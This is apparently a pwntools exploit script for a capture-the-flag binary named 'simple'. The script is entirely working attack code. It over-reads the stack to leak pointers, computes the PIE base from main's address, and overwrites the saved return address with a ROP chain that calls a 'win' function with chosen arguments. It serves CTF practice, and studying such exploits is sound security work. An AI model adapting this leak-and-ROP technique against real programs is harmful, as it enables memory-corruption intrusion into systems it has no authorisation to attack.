from pwn import *
try:
    from tqdm import tqdm
except:
    def tqdm(iter):
        return iter

context.binary = elf = ELF(args.BINARY or "./simple", checksec=False)
context.log_level = "warning"

io = process()
if args.DBG:
    gdb.attach(io.pid)

io.sendlineafter(b"? ", b"r")
io.sendlineafter(b"? ", b"512") # 512 < 0x256
leak = io.read(512)

ptrs = [unpack(leak[i:i+8]) for i in range(0, len(leak), 8)]

main_addr = ptrs[39]
elf.address = main_addr - elf.sym.main

pop_rdi_rbp = pack(elf.address + 0x135b)
pop_rsi_r15_rbp = pack(elf.address + 0x1359)
chain = pop_rdi_rbp + pack(123) + pack(0) + pop_rsi_r15_rbp + pack(321) + pack(0) * 2 + pack(elf.sym.win)

payload = list(leak)
ret_addr_idx = 35
payload[ret_addr_idx * 8:ret_addr_idx * 8 + len(chain)] = chain

io.sendlineafter(b"? ", b"w")
io.sendlineafter(b"? ", b"512")
io.send(bytes(payload))
io.sendlineafter(b"? ", b"q", timeout=1)
print(io.readall(timeout=1).decode().rstrip())
